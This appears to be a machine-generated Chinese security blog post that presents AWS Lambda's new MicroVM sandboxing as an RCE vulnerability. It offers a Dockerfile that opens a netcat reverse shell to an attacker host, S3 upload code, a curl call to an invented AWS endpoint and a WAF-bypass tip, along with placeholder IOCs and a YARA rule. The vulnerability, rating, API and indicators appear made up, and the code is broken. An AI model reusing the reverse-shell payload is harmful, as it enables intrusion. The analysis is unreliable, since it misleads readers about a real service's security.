---
layout: post
title:  "AWS Lambda新增MicroVMs隔離環境，讓AI生成的程式碼可在獨立沙箱執行"
date:   2026-06-25 02:39:56 +0000
categories: [security]
severity: medium
---

# ⚠️ 解析 AWS Lambda MicroVMs 的安全性與威脅
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS: 6.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Firecracker, Docker, Lambda Functions

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: AWS Lambda MicroVMs 的安全性主要依賴於 Firecracker 輕量虛擬化技術，然而，如果開發者沒有正確配置 Dockerfile 和 MicroVM 映像檔，可能會導致 RCE。
* **攻擊流程圖解**: 
    1. 攻擊者上傳惡意 Dockerfile 和 MicroVM 映像檔到 Amazon S3。
    2. Lambda 函數執行 Dockerfile 和 MicroVM 映像檔，初始化應用程式。
    3. 攻擊者利用惡意程式碼控制 MicroVM，執行任意命令。
* **受影響元件**: AWS Lambda MicroVMs、Docker、Firecracker

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 AWS 帳戶和 Lambda 函數的執行權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 惡意 Dockerfile
    dockerfile = """
    FROM python:3.9-slim
    RUN apt-get update && apt-get install -y netcat
    CMD ["nc", "attacker-ip", "4444", "-e", "/bin/sh"]
    """
    
    # 惡意 MicroVM 映像檔
    microvm_image = """
    {
        "name": "malicious-microvm",
        "dockerfile": dockerfile
    }
    """
    
    # 上傳惡意 Dockerfile 和 MicroVM 映像檔到 Amazon S3
    subprocess.run(["aws", "s3", "cp", dockerfile, "s3://my-bucket/malicious-dockerfile"])
    subprocess.run(["aws", "s3", "cp", microvm_image, "s3://my-bucket/malicious-microvm-image"])
    
    ```
    *範例指令*: `curl -X POST -H "Content-Type: application/json" -d '{"dockerfile": "malicious-dockerfile", "microvm_image": "malicious-microvm-image"}' https://api.aws.com/lambda/functions`
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼惡意程式碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/malicious-dockerfile |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_dockerfile {
        meta:
            description = "Detects malicious Dockerfile"
            author = "Blue Team"
        strings:
            $dockerfile = "RUN apt-get update && apt-get install -y netcat"
        condition:
            $dockerfile
    }
    
    ```
    * 或者是具體的 **SIEM 查詢語法** (Splunk/Elastic): `index=aws_lambda source="lambda_function" "malicious-dockerfile"`
* **緩解措施**: 除了 Patch 之外的 Config 修改建議，例如設定 AWS Lambda 函數的執行權限和 Dockerfile 的安全配置。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Firecracker**: 一種輕量虛擬化技術，提供虛擬機器層級的隔離。
* **Docker**: 一種容器化技術，提供應用程式的封裝和部署。
* **Lambda Functions**: 一種無伺服器計算技術，提供事件驅動和請求回應工作負載。

## 5. 🔗 參考文獻與延伸閱讀
- [AWS Lambda MicroVMs](https://aws.amazon.com/tw/lambda/microvms/)
- [Firecracker](https://firecracker-microvm.github.io/)
- [Docker](https://www.docker.com/)
- [MITRE ATT&CK](https://attack.mitre.org/)


